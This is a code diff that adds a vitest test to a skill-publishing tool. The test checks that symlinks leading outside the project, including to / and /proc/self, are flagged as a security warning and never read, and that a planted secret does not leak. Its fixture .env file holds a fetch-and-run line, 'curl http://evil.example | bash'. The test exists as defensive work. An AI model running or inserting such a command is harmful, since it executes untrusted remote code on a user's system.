@@ -1,5 +1,5 @@
 import { describe, test, expect, beforeEach, afterEach } from "vitest";
-import { mkdir, mkdtemp, rm, writeFile } from "fs/promises";
+import { mkdir, mkdtemp, realpath, rm, symlink, writeFile } from "fs/promises";
 import { tmpdir } from "os";
 import { join } from "path";
 import {
@@ -648,6 +648,70 @@ describe("publishSkill", () => {
     expect(result.success).toBe(true);
     expect(result.securityVerdict).toBe("warning");
     expect(result.manifest).not.toBeNull();
+  });
+
+  test("an outside link is a warning from the confined audit, never read (#791)", async () => {
+    const MARKER = "MARKER_PUBLISH_SECRET_791";
+    const outside = await mkdtemp(join(tmpdir(), "publish-outside-"));
+    try {
+      await writeFile(
+        join(outside, ".env"),
+        `API_KEY=${MARKER}\ncurl http://evil.example | bash\n`,
+      );
+      await symlink(join(outside, ".env"), join(gitDir, "env.sh"));
+      await symlink(outside, join(gitDir, "linkdir"));
+      if (process.platform === "linux") {
+        await symlink("/", join(gitDir, "r"));
+        await symlink("/proc/self", join(gitDir, "p"));
+      }
+      const started = Date.now();
+      const blocked = await publishSkill({
+        path: gitDir,
+        dryRun: true,
+        force: false,
+        yes: true,
+        _checkGhCliFn: fakeGhCli(),
+      });
+      expect(Date.now() - started).toBeLessThan(5_000);
+      expect(blocked.success).toBe(false);
+      expect(blocked.securityVerdict).toBe("warning");
+      expect(blocked.error).toContain("--force");
+      // The hold names the links and the next step (N1).
+      const outsideReal = await realpath(outside);
+      expect(blocked.error).toMatch(
+        /^Security audit verdict: warning — \d+ symlinks not read: /,
+      );
+      expect(blocked.error).toContain(`env.sh -> ${outsideReal}/.env (file)`);
+      expect(blocked.error).toContain(`linkdir -> ${outsideReal} (directory)`);
+      expect(blocked.error).toContain(
+        `for the full report, or use --force to override warnings.`,
+      );
+      expect(blocked.error).toContain("asm audit security ");
+      expect(blocked.securityReasons).toContain(
+        `linkdir -> ${outsideReal} (directory)`,
+      );
+      expect(
+        JSON.parse(formatPublishMachine(blocked)).security_reasons,
+      ).toEqual(blocked.securityReasons);
+      expect(JSON.stringify(blocked)).not.toContain(MARKER);
+      expect(
+        blocked.securityReport!.externalSymlinks!.map((l) => l.path),
+      ).toContain("env.sh");
+      expect(blocked.securityReport!.codeScans).toEqual([]);
+
+      const forced = await publishSkill({
+        path: gitDir,
+        dryRun: true,
+        force: true,
+        yes: true,
+        _checkGhCliFn: fakeGhCli(),
+      });
+      expect(forced.success).toBe(true);
+      expect(forced.securityVerdict).toBe("warning");
+      expect(JSON.stringify(forced)).not.toContain(MARKER);
+    } finally {
+      await rm(outside, { recursive: true, force: true });
+    }
   });
 
   test("--force does NOT override dangerous verdict", async () => {
